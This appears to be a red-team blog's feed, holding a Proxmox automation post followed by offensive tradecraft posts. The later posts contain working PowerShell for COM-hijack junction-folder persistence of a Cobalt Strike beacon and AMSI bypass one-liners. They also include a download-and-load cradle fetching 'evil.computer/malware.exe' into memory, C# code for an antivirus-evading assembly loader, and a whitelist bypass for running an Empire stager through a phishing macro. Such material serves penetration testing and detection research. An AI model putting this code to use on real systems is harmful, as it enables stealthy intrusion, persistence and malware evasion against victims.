&lt;p&gt;The next block in &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt; defines a Proxmox QEMU VM &lt;code class=&quot;highlighter-rouge&quot;&gt;resource &quot;proxmox_vm_qemu&quot; {}&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;resource &quot;proxmox_lxc&quot; {}&lt;/code&gt;. Probably the most interesting part here it that my Terraform configuration supports the creation of multiple resources at once, by defining the hostnames and IP addresses respectively in &lt;code class=&quot;highlighter-rouge&quot;&gt;var.tf&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;variable &quot;hostnames&quot; {
  description = &quot;Virtual machines to be created&quot;
  type        = list(string)
  default     = [&quot;prod-vm&quot;, &quot;staging-vm&quot;, &quot;dev-vm&quot;]
}

variable &quot;ips&quot; {
    description = &quot;IPs of the VMs, respective to the hostname order&quot;
    type        = list(string)
	default     = [&quot;10.0.42.83&quot;, &quot;10.0.42.84&quot;, &quot;10.0.42.85&quot;]
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In addition, I use Ansible as a provioner after the VM has been created. The host that kicks off the Terraform configuration will also run the Ansible playbook that in my default configuration will update the OS, create a sudo user, secure SSH and upload the SSH public keys you specify in &lt;code class=&quot;highlighter-rouge&quot;&gt;ansible/files/authorized_keys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I use the Terraform &lt;code class=&quot;highlighter-rouge&quot;&gt;connection&lt;/code&gt; block before provisioning to check whether the VM or container initialization is complete. Terraform will retry the connection and only continue executing the configuration when that connection is successful.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  # defines ssh connection to check when the VM is ready for ansible provisioning
  connection {
    host = var.ips[count.index]
    user = var.user
    private_key = file(var.ssh_keys[&quot;priv&quot;])
    agent = false
    timeout = &quot;3m&quot;
  } 

  provisioner &quot;remote-exec&quot; {
    inline = [ &quot;echo 'Cool, we are ready for provisioning'&quot;]
  }
  
  provisioner &quot;local-exec&quot; {
    working_dir = &quot;../../ansible/&quot;
    command = &quot;ansible-playbook -u ${var.user} --key-file ${var.ssh_keys[&quot;priv&quot;]} -i ${var.ips[count.index]}, provision.yaml&quot;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;cloud-init&quot;&gt;Cloud-init&lt;/h4&gt;
&lt;p&gt;The configuration will use a VM template created by &lt;a href=&quot;https://pve.proxmox.com/wiki/Cloud-Init_Support&quot;&gt;cloud-init&lt;/a&gt;. There are various guides on how to configure one. Make sure the name of the templates matches clone in main.tf.&lt;/p&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
&lt;p&gt;The complete Terraform configuration and Ansible scripts I created are available on &lt;a href=&quot;https://github.com/vivami/proxmox-automation&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Install Terraform and Ansible on your machine
    &lt;ul&gt;
      &lt;li&gt;macOS: brew install terraform ansible&lt;/li&gt;
      &lt;li&gt;Ubuntu: apt install ansible and install terraform&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git clone https://github.com/vivami/proxmox-automation.git&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Define your SSH keys in &lt;code class=&quot;highlighter-rouge&quot;&gt;proxmox-automation/ansible/files/authorized_keys&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Go to one of the directories &lt;code class=&quot;highlighter-rouge&quot;&gt;tf/ct/&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;tf/vm/&lt;/code&gt; and run &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform init&lt;/code&gt;. This will initialize the Terraform configuration and pull in the Proxmox provider.
&lt;img src=&quot;https://vanmieghem.io/assets/images/2020-12-30-automating-proxmox-with-terraform-ansible/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Store your Proxmox password in the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$PM_PASS&lt;/code&gt;:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set +o history&lt;/code&gt; (disable history before storing secrets in variables)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PM_PASS='your_proxmox_pass'&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Configure &lt;code class=&quot;highlighter-rouge&quot;&gt;var.tf&lt;/code&gt; (e.g. add your own private keys, hostnames/IPs) and &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt; where necessary&lt;/li&gt;
  &lt;li&gt;Run &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform plan -out plan&lt;/code&gt; and if everything seems good &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform apply&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;SSH into the box using &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh notroot@&amp;lt;configured_IP&amp;gt; -i ~/.ssh/private_key&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To destory to infra created run terraform destroy. 
&lt;img src=&quot;https://vanmieghem.io/assets/images/2020-12-30-automating-proxmox-with-terraform-ansible/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Automation" /><summary type="html">During the hoidays I played around a bit with automating parts of my Proxmox homeserver setup. It consists of various LXC containers (CT) and Virtual Machines (VMs) for dedicated tasks and while I don’t regularly setup new containers and VMs, it’d be nice to have an quick and automated way of doing so.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/proxmox-automation-header.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/headers/proxmox-automation-header.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Persisting our implant like the CIA</title><link href="https://vanmieghem.io/persisting-like-a-cia-agent/" rel="alternate" type="text/html" title="Persisting our implant like the CIA" /><published>2019-02-22T00:00:00+01:00</published><updated>2019-02-22T00:00:00+01:00</updated><id>https://vanmieghem.io/persisting-like-a-cia-agent</id><content type="html" xml:base="https://vanmieghem.io/persisting-like-a-cia-agent/">&lt;p&gt;In March 2017 Wikileaks published the CIA “Vault 7” leaks. Compared to the shadowbrokers NSA leak, this was not an impressive leak and was hardly retooled into red teaming tools. A while back a colleague of mine pointed me to &lt;a href=&quot;https://wikileaks.org/ciav7p1/cms/page_13763373.html&quot;&gt;this&lt;/a&gt; Vault7 page. Last weekend I found some time to get this technique to work.&lt;/p&gt;

&lt;p&gt;I tend to only write about things that I haven’t found published somewhere else, so this blog post only lays out the operational details on getting this technique to work. Please read the Vault7 page first and if you’re interested, more research related to &lt;a href=&quot;https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence&quot;&gt;COM hijacking&lt;/a&gt; and on &lt;a href=&quot;https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/&quot;&gt;Abusing the COM Registry Structure&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Basically this method works by registering a COM CLSID and using that CLSID to point to an (in this case) executable. When Windows encounters this CLSID, it performs a lookup in the registry and executes the corresponding COM object, given the correct properties are set. So called “Junction Folders” are then used to trigger CLSID lookups in Windows.&lt;/p&gt;

&lt;h3 id=&quot;configuring-peristence&quot;&gt;Configuring peristence&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\&amp;gt; [guid]::newguid()

Guid
----
781a4161-4490-408d-814a-93efe3b100c3

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The third command is most interesting because this is where you point the CLSID to your executable on disk, in this case &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\beacon.dll&lt;/code&gt;. For this method to work, there are some requirements to be met by this executable (more about that later).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
New-Item –Path &quot;HKCU:\Software\Classes\CLSID\&quot; -Name &quot;{781a4161-4490-408d-814a-93efe3b100c3}&quot;

New-Item –Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}&quot;  -Name &quot;InprocServer32&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32&quot; -Name &quot;(Default)&quot; -Value &quot;C:\beacon.dll&quot; -PropertyType &quot;String&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32&quot; -Name &quot;ThreadingModel&quot; -Value &quot;Apartment&quot; -PropertyType &quot;String&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32&quot; -Name &quot;LoadWithoutCOM&quot; -Value &quot;&quot; -PropertyType &quot;String&quot;

New-Item –Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}&quot;  -Name &quot;ShellFolder&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\ShellFolder&quot; -Name &quot;HideOnDesktop&quot; -Value &quot;&quot; -PropertyType &quot;String&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\ShellFolder&quot; -Name &quot;Attributes&quot; -Value 0xf090013d -Type DWord

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then you create your junction folder, using this CLSID we just registered. Windows Explorer will help us by hiding the CLSID:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-Item -ItemType Directory -Force -Path &quot;C:\Users\superusr\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Windows Accessories\Indexing.{781a4161-4490-408d-814a-93efe3b100c3}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For persistence, this directory should be a directory that Explorer loads when started on boot. CIA recommends using &lt;code class=&quot;highlighter-rouge&quot;&gt;Windows Accessories&lt;/code&gt;, but I’m sure there are other directories. The &lt;code class=&quot;highlighter-rouge&quot;&gt;Startup&lt;/code&gt; directory could also be used but is obviously more suspicious. Procmon could be of help finding those directories that can be used to persist using Windows Explorer (or others).&lt;/p&gt;

&lt;h3 id=&quot;dll-structure&quot;&gt;DLL structure&lt;/h3&gt;

&lt;p&gt;I’ve spent some time trying to create a C++ DLL that executes shellcode or a process, but all attempts resulted in &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; crashing. 
Eventually, I tried a stageless x64 DLL generated by Cobalt Strike containing 64-bit shellcode on a x64 version of Windows 10, which did the job.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on artifact kit’s source code, a &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc + VirtualProtect + CreateThread&lt;/code&gt; execution with stageless 64-bit shellcode should work, but I still have to figure out the exact constrains set by &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;detection&quot;&gt;Detection&lt;/h3&gt;

&lt;p&gt;Yeah, that’s a bit more difficult. Autoruns does not detect this persistency method. &lt;a href=&quot;https://twitter.com/fuseyjz&quot;&gt;@fuseyjz&lt;/a&gt; from Countercept &lt;a href=&quot;https://countercept.com/blog/hunting-for-junction-folder-persistence/&quot;&gt;created a script&lt;/a&gt; that can be used to hunt for this technique by enumerating folders containing a CLISD in &lt;code class=&quot;highlighter-rouge&quot;&gt;...\Start Menu\&lt;/code&gt; and mapping them against CLSIDs registered in the registry. However, it should be noted that this script only checks &lt;code class=&quot;highlighter-rouge&quot;&gt;HKCU&lt;/code&gt; and that &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; is not the only process that can be leveraged to perform a CLSID lookup…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Tradecraft" /><category term="Persistence" /><summary type="html">In March 2017 Wikileaks published the CIA “Vault 7” leaks. Compared to the shadowbrokers NSA leak, this was not an impressive leak and was hardly retooled into red teaming tools. A while back a colleague of mine pointed me to this Vault7 page. Last weekend I found some time to get this technique to work.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/markdown.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Towards generic .NET assembly obfuscation (Pt. 1)</title><link href="https://vanmieghem.io/towards-generic-.net-obfuscation/" rel="alternate" type="text/html" title="Towards generic .NET assembly obfuscation (Pt. 1)" /><published>2018-09-01T00:00:00+02:00</published><updated>2018-09-01T00:00:00+02:00</updated><id>https://vanmieghem.io/towards-generic-.net-obfuscation</id><content type="html" xml:base="https://vanmieghem.io/towards-generic-.net-obfuscation/">&lt;p&gt;About 2 years ago when I entered the red teaming field, PowerShell was huge. It was an easy, elegant and clean way to evade anti-malware solutions. But largely due to the efforts from Microsoft to implement defence capabilities such as &lt;a href=&quot;https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/&quot;&gt;AMSI and Script Logging into PowerShell (v5)&lt;/a&gt;, those happy PowerShell days for red teamers are over. Sure, it’s still possible:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[PSObject]Assmebly.GetType('System.Management.Automation'+'Utils'),GetType('amsiIni'+'tFailed', 'nonPublic, static').setValue($null, $true)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but it’s getting more difficult.&lt;/p&gt;

&lt;p&gt;So as often, the red team finds other low hanging fruit with which it’s easier to achieve its goal: .NET.&lt;/p&gt;

&lt;p&gt;Efforts in the industry are shifting from PowerShell towards .NET based toolkits, &lt;a href=&quot;https://github.com/GhostPack/&quot;&gt;GhostPack&lt;/a&gt;, &lt;a href=&quot;https://github.com/tevora-threat/SharpView&quot;&gt;SharpView&lt;/a&gt;, &lt;a href=&quot;https://github.com/djhohnstein/SharpWeb&quot;&gt;SharpWeb&lt;/a&gt; and &lt;a href=&quot;https://github.com/stufus/reconerator&quot;&gt;reconerator&lt;/a&gt; are examples of those efforts.&lt;/p&gt;

&lt;p&gt;Just like with PowerShell modules, it’s often possible to execute those .NET assemblies in memory without touching disk:&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&amp;quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$k=&amp;quot;XOR\_KEY&amp;quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&amp;quot;https://evil.computer/malware.exe&amp;quot;)))|%{$_-bxor$k[$i++%$k.length]}
[System.Reflection.Assembly]::Load($b) | Out-Null
$parameters=@(&amp;quot;arg1&amp;quot;, &amp;quot;arg2&amp;quot;)
[namespace.Class]::Main($parameters)&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/70ba16263c07d60075b0d6e5cfd51bc5.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;p&gt;or using Cobalt Strike’s 3.11 beacon functionality &lt;code class=&quot;highlighter-rouge&quot;&gt;execute-assembly&lt;/code&gt; [&lt;a href=&quot;https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/&quot;&gt;1&lt;/a&gt;].&lt;/p&gt;

&lt;h3 id=&quot;obfuscating-net-binaries&quot;&gt;Obfuscating .NET binaries&lt;/h3&gt;

&lt;p&gt;But sometimes it’s inevitable to drop a .NET assembly to disk, or you want to adhere to general good OpSec practices and want to obfuscate your binaries, just in case. I’d be nice to have an obfuscator for .NET assemblies that can obfuscate any .NET assembly, while leaving its functionality intact.&lt;/p&gt;

&lt;p&gt;The idea described here is centred around encapsulation of the .NET assembly and loading the encapsulated assembly via the (not logged or monitored) &lt;code class=&quot;highlighter-rouge&quot;&gt;Assembly.Load(byte[])&lt;/code&gt; .NET method at runtime. The output of our obfuscator should be an assembly that loads the original (malicious) assembly into its own process space. Our obfuscator should perform the following steps:&lt;/p&gt;

&lt;h4 id=&quot;1-take-a-net-assembly-as-input-obfuscate--encrypt-the-net-assembly-and-encode-it-to-a-base64-string&quot;&gt;1. Take a .NET assembly as input, obfuscate / encrypt the .NET assembly and encode it to a base64 string:&lt;/h4&gt;

&lt;noscript&gt;&lt;pre&gt;String path = args[0];
key = getRandomKey();
String filename = Path.GetFileNameWithoutExtension(path).ToString();
String obfuscatedBin = obfuscateBinary(path);

private String obfuscateBinary(String file) {
    byte[] assemblyBytes = fileToByteArray(@file);
    byte[] encryptedAssembly = encrypt(assemblyBytes, key);
    return System.Convert.ToBase64String(encryptedAssembly);
}&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/bdeb32458db2c33655cb46470bd7fdd9.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;h4 id=&quot;2-create-c-code-that-deobfuscates--decrypts-the-base64-string-and-loads-the-output-via-assemblyloadbyte&quot;&gt;2. Create C# code that deobfuscates / decrypts the base64 string and loads the output via &lt;code class=&quot;highlighter-rouge&quot;&gt;Assembly.Load(byte[])&lt;/code&gt;:&lt;/h4&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;srcTemplate&lt;/code&gt; variable contains a template for the (outer) assembly output of the obfuscator. Into this template, we copy the obfuscated / encrypted malicious assembly. At runtime, this obfuscated assembly will be deobfuscated and loaded via &lt;code class=&quot;highlighter-rouge&quot;&gt;Assembly.Load(byte[])&lt;/code&gt;. The tricky bit here is that after loading the assembly, we don’t know which method in the assembly &lt;code class=&quot;highlighter-rouge&quot;&gt;Main&lt;/code&gt; is. We can solve this by matching on its features: &lt;code class=&quot;highlighter-rouge&quot;&gt;public&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;static&lt;/code&gt; and arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;String[]&lt;/code&gt;. If it fails, we’ll move on to find the next method with these features. When we’ve found the method that matches these features, we’ll invoke it and pass it the arguments obtained from the “outer” assembly.&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;public static string srcTemplate = @&amp;quot;using System;
                using System.Collections.Generic;
                using System.IO;
                using System.Reflection;
                using System.Security.Cryptography;

                namespace Loader {
                    public static class Loader {
                    
                        private static readonly byte[] SALT = new byte[] { 0xba, 0xdc, 0x0f, 0xfe, 0xeb, 0xad, 0xbe, 0xfd, 0xea, 0xdb, 0xab, 0xef, 0xac, 0xe8, 0xac, 0xdc };
                        public static void Main(string[] args) {
                            byte[] bytes = decrypt(Convert.FromBase64String(Package.dotnetfile), Package.key);
                            Assembly a = Assembly.Load(bytes);

                            foreach (Type type in a.GetTypes()) {
                                try {
                                    object instance = Activator.CreateInstance(type);
                                    object[] procargs = new object[] { args };
                                    var methodInfo = type.GetMethod(&amp;quot;&amp;quot;Main&amp;quot;&amp;quot;, BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static | BindingFlags.FlattenHierarchy);
                                    var result = methodInfo.Invoke(instance, procargs);
                                }
                                catch (Exception e) { }
                            }
                        }

                        public static byte[] decrypt(byte[] cipher, string key) { // Left out }
                        
                        public class Package {
                            public static string dotnetfile = @&amp;quot;&amp;quot;INSERTHERE&amp;quot;&amp;quot;;
                            public static string key = @&amp;quot;&amp;quot;KEY&amp;quot;&amp;quot;;
                        }
                }&amp;quot;;
                
String obfuscatedBin = obfuscateBinary(path);
String tmpStr = srcTemplate.Replace(&amp;quot;INSERTHERE&amp;quot;, obfuscatedBin);
String srcFinal = tmpStr.Replace(&amp;quot;KEY&amp;quot;, key);&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/54bca3ce83ef14d9bdae549691e24e91.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;h4 id=&quot;3-compile-a-new-net-assembly-at-runtime&quot;&gt;3. Compile a new .NET assembly at runtime:&lt;/h4&gt;

&lt;p&gt;When the template is filled in, we compile the output assembly:&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;compile(srcFinal, filename + &amp;quot;_obfuscated.exe&amp;quot;);

static void compile(String source, String outfile) {
    var provider_options = new Dictionary&amp;lt;string, string&amp;gt;
    {
        {&amp;quot;CompilerVersion&amp;quot;,&amp;quot;v3.5&amp;quot;}
    };
    var provider = new Microsoft.CSharp.CSharpCodeProvider(provider_options);
    
    var compiler_params = new System.CodeDom.Compiler.CompilerParameters();
    compiler_params.OutputAssembly = outfile;
    compiler_params.GenerateExecutable = true;

    // Compile
    var results = provider.CompileAssemblyFromSource(compiler_params, source);
    Console.WriteLine(&amp;quot;Output file: {0}&amp;quot;, outfile);
    Console.WriteLine(&amp;quot;Number of Errors: {0}&amp;quot;, results.Errors.Count);
    foreach (System.CodeDom.Compiler.CompilerError err in results.Errors) {
        Console.WriteLine(&amp;quot;ERROR {0}&amp;quot;, err.ErrorText);
    }
}&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/8b5e117a65ea15f23c2b40a8b15889be.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;p&gt;When implementing this yourself, I encourage you to implement your own obfuscation / encryption routines, as well as some sandbox evasion techniques. While this technique bypasses all traditional AV products, leaving the base64 string as is in the “outer” .NET assembly will trigger some “ML engines”, since the assembly looks at lot like a loader: limited code and a large blob of &lt;code class=&quot;highlighter-rouge&quot;&gt;String&lt;/code&gt;. In a following part, I will describe some evasion methods for these “ML engines”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2018-08-31-towards-generic-net-obfuscation/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;SafetyKatz obfuscation.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2018-08-31-towards-generic-net-obfuscation/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Piping of arguments to the encapsulated Seatbelt binary.&lt;/figcaption&gt;</content><author><name>vivami</name></author><category term="blog" /><category term=".NET" /><category term="Obfuscation" /><summary type="html">About 2 years ago when I entered the red teaming field, PowerShell was huge. It was an easy, elegant and clean way to evade anti-malware solutions. But largely due to the efforts from Microsoft to implement defence capabilities such as AMSI and Script Logging into PowerShell (v5), those happy PowerShell days for red teamers are over. Sure, it’s still possible:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/markdown.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Phishing between the App Whitelists</title><link href="https://vanmieghem.io/phishing-between-the-app-whitelists/" rel="alternate" type="text/html" title="Phishing between the App Whitelists" /><published>2017-06-09T00:00:00+02:00</published><updated>2017-06-09T00:00:00+02:00</updated><id>https://vanmieghem.io/phishing-between-the-app-whitelists</id><content type="html" xml:base="https://vanmieghem.io/phishing-between-the-app-whitelists/">&lt;p&gt;An increasing number of organisations is moving towards virtual desktop environments. They are often easier to administer and maintain, and provide possibilities for additional security layers. One of those security layers more and more encountered at organisations is the RES One Workspace whitelisting solution. While &lt;a href=&quot;https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/&quot;&gt;quite&lt;/a&gt; &lt;a href=&quot;https://msitpros.com/?p=3831&quot;&gt;a&lt;/a&gt; &lt;a href=&quot;https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/&quot;&gt;lot&lt;/a&gt; was written lately on bypassing AWL (Application Whitelisting), these techniques are aimed towards bypassing Microsofts AppLocker/Device Guard in Windows 10. A reasonably secure configuration of RES One Workspace blocks execution of all of these Microsoft signed binaries (&lt;code&gt;InstallUtil.exe&lt;/code&gt;, &lt;code&gt;regsvcs.exe&lt;/code&gt;, &lt;code&gt;regasm.exe&lt;/code&gt;, &lt;code&gt;regsvr32.exe&lt;/code&gt;) used to run code within their context.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-06-09-phishing-between-the-app-whitelists/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;[Using regasm.exe](https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/) to execute &lt;code&gt;dlls&lt;/code&gt; blocked by RES One.&lt;/figcaption&gt;

&lt;p&gt;RES One also becomes annoying while &lt;a href=&quot;https://enigma0x3.net/2016/03/15/phishing-with-empire/&quot;&gt;phishing with Empire&lt;/a&gt;, as the execution of the Empire stagers is prevented by RES One, blocking the execution of &lt;code&gt;powershell.exe&lt;/code&gt; entirely for that victim user.&lt;/p&gt;

&lt;p&gt;However, either by mistake or for the sake of keeping intact certain Windows functionality, &lt;code&gt;rundll.exe&lt;/code&gt; is typically whitelisted by administrators. Depending on the type of pentest, &lt;code&gt;rundll&lt;/code&gt; can be used to spawn a Command Prompt, using the &lt;a href=&quot;https://reactos.org&quot;&gt;ReactOS&lt;/a&gt; &lt;code&gt;&lt;a href=&quot;http://www.didierstevens.com/files/software/cmd-dll_v0_0_1.zip&quot;&gt;cmd.dll&lt;/a&gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-06-09-phishing-between-the-app-whitelists/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Shortcut creation to use cmd.dll via rundll32.exe&lt;/figcaption&gt;

&lt;p&gt;Creating the following shortcut to &lt;code&gt;cmd.dll&lt;/code&gt; via &lt;code&gt;rundll32.exe&lt;/code&gt; yields a pretty functional “Command Prompt”. From there it is oftentimes possible to return to your usual PowerShell environment. Recently, &lt;a href=&quot;https://twitter.com/xP3nt4&quot;&gt;@xP3nt4&lt;/a&gt; created the &lt;a href=&quot;https://github.com/p3nt4/PowerShdll&quot;&gt;PowerSdll&lt;/a&gt; project which is a more functional alternative to &lt;code&gt;cmd.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-06-09-phishing-between-the-app-whitelists/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;cmd.dll command prompt running under the rundll32.exe context&lt;/figcaption&gt;

&lt;p&gt;The PowerSdll project also provides a bypass for our phishing issue. We can now create a macro that downloads the &lt;code&gt;PowerShdll.dll&lt;/code&gt; for the right architecture, and uses the downloaded &lt;code&gt;dll&lt;/code&gt; to execute a PowerShell script (in this case an Empire stager) via &lt;code&gt;rundll&lt;/code&gt;.&lt;/p&gt;

